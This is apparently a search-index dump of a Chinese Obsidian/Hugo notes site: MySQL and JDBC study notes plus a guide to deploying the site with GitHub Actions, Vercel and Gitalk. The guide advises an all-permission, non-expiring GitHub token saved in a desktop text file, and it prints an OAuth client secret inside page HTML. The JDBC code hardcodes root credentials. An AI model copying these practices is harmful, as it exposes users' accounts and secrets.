NO\n\u003e\t\n\u003e\t缺点：不支持事务。数据容易丢失。因为所有数据和索引都是存储在内存当中的。\n\u003e\t优点：查询速度最快。\n\u003e\t以前叫做HEPA引擎。","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0012_%E4%BA%8B%E5%8A%A1":{"title":"00012_事务","content":"# 00012_事务\n\n什么是事务？\n\u003e\n\u003e\t\t一个事务是一个完整的业务逻辑单元，不可再分。\n\u003e\t\t要想保证以上的两条DML语句同时成功或者同时失败，那么就需要使用数据库的“事务机制”。\n\n和事务相关的语句只有：**DML语句。**（insert delete update）\n\u003e\t\t为什么？因为它们这三个语句都是和数据库表当中的“数据”相关的。\n\u003e\t\t事务的存在是为了保证数据的**完整性**，**安全性**。\n\n\n\n\u003e[!faq]+ 事务的特性？\n\u003e\t事务包括四大特性：ACID\n\u003e\tA: 原子性：事务是最小的工作单元，不可再分。\n\u003e\tC: 一致性：事务必须保证多条DML语句同时成功或者同时失败。\n\u003e\tI：隔离性：事务A与事务B之间具有隔离。\n\u003e\tD：持久性：持久性说的是最终数据必须持久化到硬盘文件中，事务才算成功的结束。\n\n\n\u003e[!faq]+ 关于事务之间的隔离性\n\u003e事务隔离性存在隔离级别，理论上隔离级别包括4个：\n\u003e1. 第一级别：读未提交（read uncommitted）\n\u003e\t对方事务还没有提交，我们当前事务可以读取到对方未提交的数据。\n\u003e\t读未提交存在脏读（Dirty Read）现象：表示读到了脏的数据。\n\u003e2. 第二级别：读已提交（read committed）\n\u003e\t对方事务提交之后的数据我方可以读取到。\n\u003e\t这种隔离级别解决了: 脏读现象没有了。\n\u003e\t读已提交存在的问题是：不可重复读。\n\u003e3. 第三级别：可重复读（repeatable read）\n\u003e\t这种隔离级别解决了：不可重复读问题。\n\u003e\t这种隔离级别存在的问题是：读取到的数据是幻象。\n\u003e4. 第四级别：序列化读/串行化读（serializable） \n\u003e\t解决了所有问题。\n\u003e\t效率低。需要事务排队。\n\n\n**oracle数据库默认的隔离级别是：读已提交。\nmysql数据库默认的隔离级别是：可重复读。**\n\n\n\n### 自动提交eg\n```bash\nmysql\u003e create table t_user(id int primary key auto_increment,username varchar(255));\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql\u003e insert into t_user(username) values('zs');\nQuery OK, 1 row affected (0.01 sec)\n\nmysql\u003e select * from t_user;\n+----+----------+\n| id | username |\n+----+----------+\n|  1 | zs       |\n+----+----------+\n1 row in set (0.00 sec)\n\nmysql\u003e rollback;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql\u003e select * from t_user;\n+----+----------+\n| id | username |\n+----+----------+\n|  1 | zs       |\n+----+----------+\n1 row in set (0.00 sec)\n```\n\n### 关闭自动提交机制 start transaction;\n```sql\nmysql\u003e start transaction;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql\u003e insert into t_user(username) values('lisi');\nQuery OK, 1 row affected (0.00 sec)\n\nmysql\u003e select * from t_user;\n+----+----------+\n| id | username |\n+----+----------+\n|  1 | zs       |\n|  2 | lisi     |\n+----+----------+\n2 rows in set (0.00 sec)\n\nmysql\u003e insert into t_user(username) values('wangwu');\nQuery OK, 1 row affected (0.00 sec)\n\nmysql\u003e select * from t_user;\n+----+----------+\n| id | username |\n+----+----------+\n|  1 | zs       |\n|  2 | lisi     |\n|  3 | wangwu   |\n+----+----------+\n3 rows in set (0.00 sec)\n\nmysql\u003e rollback;\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql\u003e select * from t_user;\n+----+----------+\n| id | username |\n+----+----------+\n|  1 | zs       |\n+----+----------+\n1 row in set (0.00 sec)\n```\n\n### 设置事务机制\n读未提交\n```sql\nset global transaction isolation level read uncommitted;\n```\n读已提交\n```sql\nset global transaction isolation level read committed;\n```\n可重复读\n```sql\nset global transaction isolation level repeatable read;\n```\n序列化读/串行化读\n```sql\nset global transaction isolation level serializable;\n```","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0012_JBMC%E5%B0%81%E8%A3%85%E7%B1%BB":{"title":"0012_JBMC封装类","content":"# 0012_JBMC封装类\n```java\npackage jdbc;  \n  \nimport java.sql.*;  \n  \npublic class DBUtil {  \n    //不需要new对象，直接调用工具类中的公开静态方法即可  \n    private DBUtil() {  \n  \n    }  \n  \n    /**  \n     * 静态代码块，加载类的时候执行一次，后面就需要执行了  \n     * 用于注册驱动  \n     */  \n    static {  \n        try {  \n            Class.forName(\"com.mysql.jdbc.Driver\");  \n        } catch (ClassNotFoundException e) {  \n            e.printStackTrace();  \n        }  \n    }  \n  \n    /**  \n     *     * @return 将sql连接对象返回去  \n     * @throws SQLException  sql异常跑出去，让父类异常处理  \n     */  \n    public static Connection  getConnection() throws SQLException {  \n        return DriverManager.getConnection(\"jdbc:mysql://localhost:3306/bjpowernode\",\"root\",\"root\");  \n    }  \n  \n    /**  \n     * 释放资源  \n     * @param con   sql连接对象  \n     * @param st    sql操作对象  \n     * @param rs    资源集合对象  \n     */  \n    public static void close(Connection con, Statement st, ResultSet rs){  \n        if (rs!=null){  \n            try {  \n                rs.close();  \n            } catch (SQLException e) {  \n                e.printStackTrace();  \n            }  \n        }  \n        if (st!=null){  \n            try {  \n                st.close();  \n            } catch (SQLException e) {  \n                e.printStackTrace();  \n            }  \n        }  \n        if (con!=null){  \n            try {  \n                con.close();  \n            }catch(SQLException e){  \n                e.printStackTrace();  \n            }  \n        }  \n    }  \n}\n```","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0013_%E7%B4%A2%E5%BC%95":{"title":"0013_索引","content":"# 0013_索引\n\n\n# 什么是索引？有什么用？\n\u003e索引就相当于一本书的目录，通过目录可以快速的找到对应的资源。\n\u003e在数据库方面，查询一张表的时候有两种检索方式：\n\u003e1. 第一种方式：全表扫描\n\u003e2. 第二种方式：根据索引检索（效率很高）\n\n\n## 索引为什么可以提高检索效率呢？\n\u003e\t其实最根本的原理是缩小了扫描的范围。\n\u003e索引虽然可以提高检索效率，但是不能随意的添加索引，因为索引也是数据库当中\n\u003e的对象，也需要数据库不断的维护。是有维护成本的。比如，表中的数据经常被修改\n\u003e这样就不适合添加索引，因为数据一旦修改，索引需要重新排序，进行维护。\n\u003e\n\u003e添加索引是给某一个字段，或者说某些字段添加索引。\n\n### 举例\n\u003e\t\tselect ename,sal from emp where ename = 'SMITH';\n\u003e\t\t当ename字段上没有添加索引的时候，以上sql语句会进行全表扫描，扫描ename字段中所有的值。\n\u003e\t\t当ename字段上添加索引的时候，以上sql语句会根据索引扫描，快速定位。\n\n## 怎么创建索引对象？怎么删除索引对象？\n创建索引对象：\n```sql\ncreate index 索引名称 on 表名(字段名);\n```\n删除索引对象：\n```sql\ndrop index 索引名称 on 表名;\n```\n\n\n## 什么时候考虑给字段添加索引？（满足什么条件）\n\u003e\t\t* 数据量庞大。（根据客户的需求，根据线上的环境）\n\u003e\t\t* 该字段很少的DML操作。（因为字段进行修改操作，索引也需要维护）\n\u003e\t\t* 该字段经常出现在where子句中。（经常根据哪个字段查询）\n\u003e\t\n## 注意：主键和具有unique约束的字段自动会添加索引。\n\u003e\t\t根据主键查询效率较高。尽量根据主键检索。\n\u003e\t\n## 查看sql语句的执行计划：\n```sql\n\t\tmysql\u003e explain select ename,sal from emp where sal = 5000;\n\t\t+----+-------------+-------+------+---------------+------+---------+------+------+-------------+\n\t\t| id | select_type | table | type | possible_keys | key  | key_len | ref  | rows | Extra       |\n\t\t+----+-------------+-------+------+---------------+------+---------+------+------+-------------+\n\t\t|  1 | SIMPLE      | emp   | ALL  | NULL          | NULL | NULL    | NULL |   14 | Using where |\n\t\t+----+-------------+-------+------+---------------+------+---------+------+------+-------------+\n\n\t\t给薪资sal字段添加索引：\n\t\t\tcreate index emp_sal_index on emp(sal);\n\t\t\n\t\tmysql\u003e explain select ename,sal from emp where sal = 5000;\n\t\t+----+-------------+-------+------+---------------+---------------+---------+-------+------+-------------+\n\t\t| id | select_type | table | type | possible_keys | key           | key_len | ref   | rows | Extra       |\n\t\t+----+-------------+-------+------+---------------+---------------+---------+-------+------+-------------+\n\t\t|  1 | SIMPLE      | emp   | ref  | emp_sal_index | emp_sal_index | 9       | const |    1 | Using where |\n\t\t+----+-------------+-------+------+---------------+---------------+---------+-------+------+-------------+\n```\n\t\n## 索引底层采用的数据结构是：B + Tree\n## 索引的实现原理？\n\u003e通过B Tree缩小扫描范围，底层索引进行了排序，分区，索引会携带数据在表中的“物理地址”，\n\u003e最终通过索引检索到数据之后，获取到关联的物理地址，通过物理地址定位表中的数据，效率\n\u003e是最高的。\n\u003e\tselect ename from emp where ename = 'SMITH';\n\u003e\t通过索引转换为：\n\u003e\tselect ename from emp where 物理地址 = 0x3;\n\u003e\n## 索引的分类？\n\u003e\t\t单一索引：给单个字段添加索引\n\u003e\t\t复合索引: 给多个字段联合起来添加1个索引\n\u003e\t\t主键索引：主键上会自动添加索引\n\u003e\t\t唯一索引：有unique约束的字段上会自动添加索引\n\u003e\t\t....\n\u003e\t\n## 索引什么时候失效？\n\u003e\t\tselect ename from emp where ename like '%A%';\n\u003e\t\t模糊查询的时候，第一个通配符使用的是%，这个时候索引是失效的。\n\u003e\n","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0013_MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8":{"title":"0013_MySQL数据库相关的基本使用","content":"# 0013_MySQL数据库相关的基本使用\n## 准备MySQL\n安装MySQL，老是出现安不上的问题，nt软件，重新多安几次\n## Navicat的基本使用\n没啥说的\n## 设计数据库表\n1. 下载**PowerDesigner**工具\n2. 打开之后，选择`create model`--\u003e`model types`--\u003e`physical data model`\n3. 在下面的DBMS中选择mysql的对应版本，比如mysql5.0![](../../../assets/Pasted%20image%2020220821133926.png)，点击ok\n4. 设计表![](../../../assets/Pasted%20image%2020220821134220.png)\n5. 保存sql脚本,你可以将保存的sql脚本继续进行优化修改 ![](../../../assets/Pasted%20image%2020220821134404.png)\n6. cmd登录mysql后，可以采用`source xxx.sql`执行sql脚本，将表创建，或者右击sql文件，用navicat软件打开，也可以在里面进行run导入","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0014%E8%A7%86%E5%9B%BEview":{"title":"0014视图(view)","content":"# 0014视图(view)\n\n# 什么是视图？\n\u003e站在不同的角度去看到数据。（同一张表的数据，通过不同的角度去看待）。\n\u003e\n## 怎么创建视图？怎么删除视图？\n\u003ecreate view myview as select empno,ename from emp;\n\u003edrop view myview;\n\u003e\n\u003e注意：只有DQL语句才能以视图对象的方式创建出来。\n\u003e\n## 对视图进行增删改查，会影响到原表数据。（通过视图影响原表数据的，不是直接操作的原表）\n\u003e可以对视图进行CRUD操作。\n\u003e\n## 面向视图操作？\n\u003emysql\u003e select * from myview;\n\u003e+-------+--------+\n\u003e| empno | ename  |\n\u003e+-------+--------+\n\u003e|  7369 | SMITH  |\n\u003e|  7499 | ALLEN  |\n\u003e|  7521 | WARD   |\n\u003e|  7566 | JONES  |\n\u003e|  7654 | MARTIN |\n\u003e|  7698 | BLAKE  |\n\u003e|  7782 | CLARK  |\n\u003e|  7788 | SCOTT  |\n\u003e|  7839 | KING   |\n\u003e|  7844 | TURNER |\n\u003e|  7876 | ADAMS  |\n\u003e|  7900 | JAMES  |\n\u003e|  7902 | FORD   |\n\u003e|  7934 | MILLER |\n\u003e+-------+--------+\n\u003e\n\u003ecreate table emp_bak as select * from emp;\n\u003ecreate view myview1 as select empno,ename,sal from emp_bak;\n\u003eupdate myview1 set ename='hehe',sal=1 where empno = 7369; // 通过视图修改原表数据。\n\u003edelete from myview1 where empno = 7369; // 通过视图删除原表数据。\n## 视图的作用？\n\u003e视图可以**隐藏表的实现细节**。保密级别较高的系统，数据库只对外提供相关的视图，java程序员\n\u003e只对视图对象进行CRUD。\n\u003e","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0014_%E6%82%B2%E8%A7%82%E9%94%81%E8%A1%8C%E7%BA%A7%E9%94%81%E4%BB%A5%E5%8F%8A%E4%B9%90%E8%A7%82%E9%94%81%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86":{"title":"0014_悲观锁（行级锁）以及乐观锁基本认识","content":"# 0014_悲观锁（行级锁）以及乐观锁基本认识\n悲观锁：\nselect语句后面加上`for update`\n比如\n```sql\nselect cname from dept where no=12 for update`\n那么查询出来的数据，就会被加锁，直到释放之前，都不能都被别的线程使用修改\n简单的理解就是：线程同步锁，嘎嘎好理解\n```\n查询出出来的语句会被锁上，别的线程无法修改其中的数据\n**事务需要排队执行，类似于同步线程，要修改的数据需要事务一个一个的排队**\n\n\n乐观锁\n\t**支持并发**，需要修改的数据，每次读取都有一个版本号\n\t事务不需要排队，每次读取都有一个版本号（比如1.1），提交的时候核对版本号是否和读取的一样（1.1）\n\t一样就提交，并修改成新的版本号（1.2）\n\t不一样就回滚，不提交，重新读取\n\t","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0015_DBA%E5%91%BD%E4%BB%A4":{"title":"0015_DBA命令","content":"# 0015_DBA命令\n\n## 将数据库当中的数据导出\n\u003e在windows的dos命令窗口中执行：（导出整个库）\n\u003emysqldump bjpowernode\u003eD:\\bjpowernode.sql -uroot -p333\n\u003e\n\u003e在windows的dos命令窗口中执行：（导出指定数据库当中的指定表）\n\u003emysqldump bjpowernode emp\u003eD:\\bjpowernode.sql -uroot –p123\n\u003e\n## 导入数据\n\u003ecreate database bjpowernode;\n\u003euse bjpowernode;\n\u003esource D:\\bjpowernode.sql","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0016_%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E4%B8%89%E8%8C%83%E5%BC%8F":{"title":"0016_数据库设计三范式","content":"# 0016_数据库设计三范式\n\n什么是设计范式？\n\u003e设计表的依据。按照这个三范式设计的表不会出现数据冗余。\n\u003e\n## 三范式都是哪些？\n\n\u003e第一范式：任何一张表都应该有主键，并且每一个字段原子性不可再分。\n\u003e第二范式：建立在第一范式的基础之上，所有非主键字段完全依赖主键，不能产生部分依赖。\n\u003e第三范式：建立在第二范式的基础之上，所有非主键字段直接依赖主键，不能产生传递依赖。\n\n\n两张表，多的表加外键","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0017_%E4%B8%80%E5%AF%B9%E4%B8%80%E6%80%8E%E4%B9%88%E8%AE%BE%E8%AE%A1":{"title":"0017_一对一怎么设计？","content":"# 0017_一对一怎么设计？\n\n## 一对一设计有两种方案：主键共享\n```\n\u003et_user_login  用户登录表\n\u003eid(pk)\t\tusername\t\t\tpassword\n\u003e--------------------------------------\n\u003e1\t\t\t\tzs\t\t\t\t\t123\n\u003e2\t\t\t\tls\t\t\t\t\t456\n\u003e\n\u003et_user_detail 用户详细信息表\n\u003eid(pk+fk)\trealname\t\t\ttel\t\t\t....\n\u003e------------------------------------------------\n\u003e1\t\t\t\t张三\t\t\t\t1111111111\n\u003e2\t\t\t\t李四\t\t\t\t1111415621\n```\n\n## 一对一设计有两种方案：外键唯一。\n```\n\u003et_user_login  用户登录表\n\u003eid(pk)\t\tusername\t\t\tpassword\n\u003e--------------------------------------\n\u003e1\t\t\t\tzs\t\t\t\t\t123\n\u003e2\t\t\t\tls\t\t\t\t\t456\n\u003e\n\u003et_user_detail 用户详细信息表\n\u003eid(pk)\t   realname\t\t\ttel\t\t\t\tuserid(fk+unique)....\n\u003e-----------------------------------------------------------\n\u003e1\t\t\t\t张三\t\t\t\t1111111111\t\t2\n\u003e2\t\t\t\t李四\t\t\t\t1111415621\t\t1\n```\n","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0018_MySQL%E4%BF%AE%E6%94%B9root%E5%AF%86%E7%A0%81":{"title":"MySQL修改root密码","content":"# 0018_修改root密码\n方法1： 用SET PASSWORD命令 \n首先登录MySQL。 \n格式：mysql\u003e set password for 用户名@localhost = password('新密码'); \n例子：mysql\u003e set password for root@localhost = password('123'); \n\n方法2：用mysqladmin \n格式：mysqladmin -u用户名 -p旧密码 password 新密码 \n例子：mysqladmin -uroot -p123456 password 123 \n\n方法3：用UPDATE直接编辑user表 \n首先登录MySQL。 \nmysql\u003e use mysql; \nmysql\u003e update user set password=password('123') where user='root' and host='localhost'; \nmysql\u003e flush privileges; \n\n方法4：在忘记root密码的时候，可以这样 \n以windows为例： \n1. 关闭正在运行的MySQL服务。 \n2. 打开DOS窗口，转到mysql\\bin目录。 \n3. 输入mysqld --skip-grant-tables 回车。--skip-grant-tables 的意思是启动MySQL服务的时候跳过权限表认证。 \n4. 再开一个DOS窗口（因为刚才那个DOS窗口已经不能动了），转到mysql\\bin目录。 \n5. 输入mysql回车，如果成功，将出现MySQL提示符 \u003e。 \n6. 连接权限数据库： use mysql; 。 \n6. 改密码：update user set password=password(\"123\") where user=\"root\";（别忘了最后加分号） 。 \n7. 刷新权限（必须步骤）：flush privileges;　。 \n8. 退出 quit。 \n9. 注销系统，再进入，使用用户名root和刚才设置的新密码123登录。","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/001_%E9%83%A8%E7%BD%B2Obsidian%E9%9D%99%E6%80%81%E7%9F%A5%E8%AF%86%E5%BA%93%E7%BD%91%E7%AB%99":{"title":"001_部署Obsidian静态知识库网站","content":"# 部署\n\n## 基本结构\n\n```mermaid\ngraph BT\n\tzck(子模块_笔记仓库)\n\tfckhugo(父仓库hugo分支)\n\tfckmaster(父仓库master分支)--\u003ewz(你vercel部署的网站)\n\tzck.-通过推送workflows+TOKEN推送到.-\u003efckhugo\n\tfckhugo.-通过转换为gitpage的workflows+TOKEN转换到 .-\u003efckmaster\n\t\n\t\n\t\n```\n\n\n\n## 仓库设置以及部署\n\n### 父仓库（用于发布仓库：fork）\n\n1. fork我的的ObPublish仓库，然后使用git工具克隆`clone`到本地。\n\n   ```\n   git clone 你的仓库链接\n   ```\n\n   ![image-20220915232031007](../assets/image-20220915232031007.png)\n\n2. 使用`vscode`打开这个仓库，然后在 `设置`--\u003e`查看`--\u003e`终端` 打开终端，可以在此处进行git的基本操作\n\n   1. ![image-20220915230907147](../assets/image-20220915230907147.png)\n   2. 选择bash终端，这个是专门用来执行git命令的，当然，你也可以用除了shell之外的其他终端![image-20220915231014606](../assets/image-20220915231014606.png)\n\n3. 查看基本的情况\n\n   ```bash\n   $ git remote -v #查看当前连接的远程仓库\n   origin  https://github.com/tianzhongs/ObPublish.git (fetch)\n   origin  https://github.com/tianzhongs/ObPublish.git (push)\n   \n   22305@□□Ӵ□□ȥ MINGW64 ~/Desktop/ObPublish (hugo)\n   $ git submodule status #查看子模块状态，我的因为已经删除了所有的子模块文件，不会显示\n   \n   ```\n\n   \n\n4. 如果你有子模块仓库（仓库上的content上有@地址，就说明有子模块仓库），你需要采用一下命令对子模块进行删除，删除之后才能连接上你自己的(以下命令需要在bash下使用)\n\n   ```bash\n   rm -rf content     #删除子模块目录及源码 bash下使用\n   vi .gitmodules       #删除项目目录下.gitmodules文件中子模块相关条目 bash下使用\n   vi .git/config       #删除配置项中子模块相关条目 bash下使用\n   rm .git/module/*     #删除模块下的子模块目录，每个子模块对应一个目录，注意只删除对应的子模块目录即可 \n   ```\n\n### 子仓库设置\n\n1. github上新建一个远程仓库，建议勾选 `私有`，添加一个readme文件（可以初始化仓库，减少麻烦）。**此仓库保存你obsidian知识库中的文件，并通过之后设置的工作流推送到父仓库（发布仓库）**![image-20220915232548960](../assets/image-20220915232548960.png)\n\n2. 将此仓库克隆到本地\n\n   ```bash\n   git clone 你的仓库链接\n   ```\n\n3. 将此知识库必备文件包**解压后**放到你克隆的仓库中\n\n   [文件包点击可达下载地址](https://www.notion.so/tianzhongs/obsidian-de6a07362b774712b51ec44e12cd344d#166e6c51325148a28330dc8be53b2996)\n\n   所勾选的三个文件或文件夹是必须的目录结构，其中的部分文档和模板可以删除![image-20220915234134787](../assets/image-20220915234134787.png)\n\n4. 用vscode打开此知识库仓库，通过vscode或git命令进行提交，git命令采用以下进行\n\n   ```bash\n   git add . #添加所有文件到暂存区\n   git commit -m \"提交必备文件\" #提交信息\n   git push #提交到远程仓库\n   ```\n\n### 子模块仓库配置\n\n\u003e 因为笔记仓库和发布仓库是分离的，所以需要将子仓库与父仓库进行关联。将子仓库作为子模块放到父仓库中，作为父仓库的content文件夹\n\n1. 打开父仓库（发布仓库Obpublish），使用git命令\n\n   ```bash\n   git submodule add https://github.com/tianzhongs/ObZhishiku.git content #将仓库作为模块放到父仓库的content文件夹中\n   git submodule update --init #初始化子模块\n   git submodule update --remote #子模块最新的内容版本同步到父仓库\n   ```\n\n   ![image-20220916002216473](../assets/image-20220916002216473.png)\n\n   可以在本地父仓库（发布仓库）中看到多了一个content文件夹，其中包含的就是笔记仓库的内容\n\n2. 将本地的操作同步到github上(**提交三部曲**)\n\n   ```bash\n   git add .\n   git commit -m \"添加子模块\"\n   git push #提交到远程仓库\n   ```\n\n   ![image-20220916002603531](../assets/image-20220916002603531.png)\n\n此时，就可以在github父仓库中看到子模块的状态，有个`@`符号，所@的就是子模块的版本号，点击可以进入到对应的子仓库版本号 的内容\n\n## 配置转换工作流文件\n\n在父仓库中，有一个`workflows`文件夹中有一个`deploy.yaml`文件，是github的专属工作流文件，可以在其中部署自己的脚本等等达到自动化。\n\n### 添加TOKEN\n\n1. 打开github，点击头像，在弹出的选项中选择 `settings` ，往下翻，找到`Developer settings`（开发者设置）中，添加一个TOKEN，全部权限都勾选，期限设置永久\n   1. ![image-20220916003405259](../assets/image-20220916003405259.png)\n   2. ![image-20220916003652746](../assets/image-20220916003652746.png)\n\n2. 复制你的TOKEN，在桌面新建一个txt保存起来，因为之后也需要用到\n\n3. 在github上打开父仓库，点击**仓库的settings**,在下面可以找到添加，将刚才复制的TOKEN添加进去作为一个环境变量，需要注意：名字必须是全大写的`TOKEN`![image-20220916004320660](../assets/image-20220916004320660.png)\n\n4. 返回到本地父仓库（发布仓库）的`.github\\workflows\\deploy.yaml`，对工作流进行基本的设置。设置之后，git推送三部曲（add，commit，push到远程仓库）\n\n   ```yaml\n   name: Deploy to GitHub Pages\n   \n   on:\n     push:\n       branches:\n         - hugo\n   \n     workflow_dispatch:\n   \n   jobs:\n     deploy:\n       runs-on: ubuntu-22.04\n       steps:\n         - uses: actions/checkout@v2\n           with: \n             token: ${{ secrets.TOKEN }}  #这里是添加的token，不用设置，需要在仓库中添加TOKEN，$代表的是调用刚才添加的环境变量，所以不需要设置\n             submodules: 'true'\n         - name: Checkout submodules\n           run: git submodule update --init --recursive\n   \n         - name: config1 \n           run: rm -rf content/.obsidian content/cedict_ts.u8 content/Extras/Templates  \u0026\u0026 mv content/*.md content/Atlas \u0026\u0026 find content/ -name \"*.md\" | xargs -I file  mv -f file content \u0026\u0026  mv content/AboutTheGarden.md content/_index.md \n         \n         - name: config2\n           run: \"ls content/ \u0026\u0026 grep -lr --null 'title' content/* | xargs -0 sed -i -E -r 's/title: \"(.*)/title: \\\"\\\\1\\\"/g'\"\"\n         \n         - name: config3 \n           run: rm -rf content/*.md-E\n   \n         \n         - name: Build Link Index\n           uses: jackyzha0/hugo-obsidian@v2.18\n           with:\n             index: true\n             input: content\n             output: assets/indices\n             root: .\n   \n   \n         - name: Setup Hugo\n           uses: peaceiris/actions-hugo@v2\n           with:\n             hugo-version: '0.96.0'\n             extended: true\n   \n         - name: Build\n           run: hugo --minify --debug\n   \n         - name: Deploy\n           uses: peaceiris/actions-gh-pages@v3\n           with:\n             github_token: ${{ secrets.GITHUB_TOKEN }}\n             publish_dir: ./public\n             publish_branch: master  # deploying branch\n             cname: www.baidu.com   #修改成你的域名\n   ```\n\n   \n\n5. 将子模块的再次同步到父仓库一下，在本地父仓库（发布仓库）中执行以下命令（如果没有推送的东西，就打开readme文件，随便加个空格就有改动，可以推送了）\n\n   ```bash\n   git submodule update --init #初始化子模块\n   git submodule update --remote #子模块最新的内容版本同步到父仓库\n   git add .\n   git commit -m \"最新的\"\n   git psuh\n   ```\n\n6. 推送之后，打开github发布的远程仓库ObPublish中的`action`，这里是查看工作流的地方，查看刚才推送的能否成功转换，之前错误的工作流不用管![image-20220916005313382](../assets/image-20220916005313382.png)\n7. 你可以点击github中的code面板，可以选择分支，你会发现多了一个`master`分支，那个就是通过我们的工作流将hugo分支中子模块-我们的笔记content中的内容转换成了html文件放到了master分支中\n\n## Vercel基本部署\n\n1. 打开 [verel](https://vercel.com/)次用github登录之后，选择新建Project（项目），选择import你的发布仓库obPublish\n2. 选择环境是other，即默认没有环境，因为部署的是master分支，里面全是html文件，浏览器能够执行，不需要环境![image-20220916005911016](../assets/image-20220916005911016.png)开始部署\n3. 然后成功之后，你会发现主界面是错误，原因是因为vercel默认部署你github仓库中的默认分支，所以需要 **调整部署分支，为master**：在你部署的这个项目中点击settings，选择git，然后设置分支，保存。\n4. ![image-20220916010146988](../assets/image-20220916010146988.png)\n5. 你还需要在本地仓库中修改一下父仓库的readme文件，随便加个空格就行。这样做的原因是：vercel每次进行部署，都建立在你的仓库有改动的情况下，因为没有改动，他就不会部署你的master分支，所以**你在本地父仓库中修改内容，push推送（git推送三部曲）到远程仓库就好**（推送之后你依旧可以到github远程父仓库中的`action`查看工作流的情况，工作流成功之后，verel才会开始拉取github中的master分支，开始部署网站。）![image-20220916010603652](../assets/image-20220916010603652.png)\n6. 可以看到已经部署成功，在vercel也成功的部署了master分支![image-20220916010653216](../assets/image-20220916010653216.png)\n7. 点击overview面板中的visit进行访问，可以看到部署成功的界面了（搜索功能不能使用，因为父仓库中的`config.toml`文件中没有配置成你的域名，你也可以配置成vercel的项目域名Domains）。![image-20220916010751475](../assets/image-20220916010751475.png)\n\n## 配置文件部分\n\n### 域名\n\n1. 打开vercel的`settings`面板，在选择`Domain`，添加你的域名（域名解析方面不赘述），添加之后如图，当然你也可以用vercel自带的项目域名![image-20220916105704328](../assets/image-20220916105704328.png)\n\n\n\n### 父仓库中的文件配置\n\n`config.toml`：配置baseURl，配置成你的域名，刚才在vercel中设置的或者vercel项目自带生成的（此处域名不改成自己的，无法使用搜索功能）\n\n`data\\config.yaml`：配置一些基本信息\n\n### 设置子模块工作流(用于推送到父模块的hugo分支)\n\n1. 添加TOKEN到action\t\n\n   和之前的步骤一样，在github子模块笔记仓库中的settings中添加刚才的TOKEN进去，名字必须是全部大写\n\n2. 点击仓库才action，在这里可以添加工作流，如果你，如果仓库中有工作流文件，你可以对其进行修改，工作流在.github/workflows文件夹下\n\n3. 开始新建工作流![image-20220916160314431](../assets/image-20220916160314431.png)\n\n4. 全部删除，将以下内容复制粘贴进去，然后进行修改配置\n\n   ```yaml\n   name: Send submodule updates to parent repo\n   \n   on:\n     push:\n       branches:\n         - main\n   \n   jobs:\n     update:\n       runs-on: ubuntu-latest\n   \n       steps:\n         - uses: actions/checkout@v2\n           with:\n             repository: zhangsan/dg3 # 设置你用户名/发布仓库的仓库名,作用是将子模块更新到父仓库dg3\n             token: ${{ secrets.TOKEN }}\n             # 把子模块打开\n             submodules: 'true'\n   \n         - name: Pull \u0026 update submodules recursively\n           run: |\n             git submodule update --init --recursive\n             git submodule update --recursive --remote\n         - name: Commit\n           run: |\n             git config user.email \"提交的邮箱，一般是你github的邮箱\" #修改\n             git config user.name \"你的名称\" #修改\n             git add --all\n             git commit -m \"Update submodules\" || echo \"No changes to commit\"\n             git push\n   ```\n\n   5. 提交之后，点击action进行查看![image-20220916161016944](../assets/image-20220916161016944.png)\n   6. 到这里，在本地笔记仓库中做了修改，就可以直接推送，就不需要到父仓库中进行子模块同步了，工作流会自动在云端同步。\n\n\n\n## 额外评论区设置\n\n预览图\n\n![image-20220916163756206](../assets/image-20220916163756206.png)\n\n\u003e 为了方便配置，我选择的是gitTalk的方式，开始我使用了`waline`的方式去配置，虽然能够评论，但是不清楚为什么一直加载评论区，所以我就弃用了，waline的界面配置性更高，同时可以无需登录评论。\n\n### gitTalk评论区进行配置\n\n\u003e 因为评论区是和仓库的issue相互连接的，评论区中的内容都会转到仓库issue中，因为笔记仓库私有化，所以相对于评论的可见性，我建议可以自己进行选择。比如我希望别人也能够看见评论，在父仓库发布仓库中进行以下步骤。\n\n注意：**仓库的issue必须打开**，默认是打开的\n\n1. 点击`头像`--\u003e`setting`--\u003e`开发者设置`--\u003e`OAuth Apps`，或者直接点击这个连接进入(开发者设置)[https://github.com/settings/developers]，添加一个应用\n\n2. 设置好你的域名，别的随便设置![image-20220916162639143](../assets/image-20220916162639143.png)\n\n3. 复制id和密码，![image-20220916162812917](../assets/image-20220916162812917.png)\n\n4. 打开本地仓库父仓库的`layouts\\partials\\contact.html`文件，末尾添加以下代码，然后配置id和密码\n\n   ```html\n   \n   \u003c!-- 以下为你需要配置的评论区，以下部分可以删除 --\u003e\n   \u003c!-- 引入 --\u003e\n   \u003clink rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css\"\u003e\n   \u003cscript src=\"https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js\"\u003e\n       \u003c/script\u003e\n   \n       \u003c!-- 添加一个容器--\u003e\n       \u003cdiv id=\"gitalk-container\"\u003e\u003c/div\u003e\n   \n       \u003c!-- 生成 gitalk 插件--\u003e\n       \u003cscript\u003e\n           var gitalk = new Gitalk({\n               clientID: 'b3de86d5654c36a4a587', //Client ID 自己配置\n   \n               clientSecret: '973b351e5a54ff9ea6d93e7db3f431ueef48dc2d', //Client Secret 自己配置\n   \n               repo: 'blogtalk',//保存评论的仓库仓库名称  自己配置\n               owner: 'gfddgngs',//仓库拥有者  自己配置\n               admin: ['dsdnzhongs'], 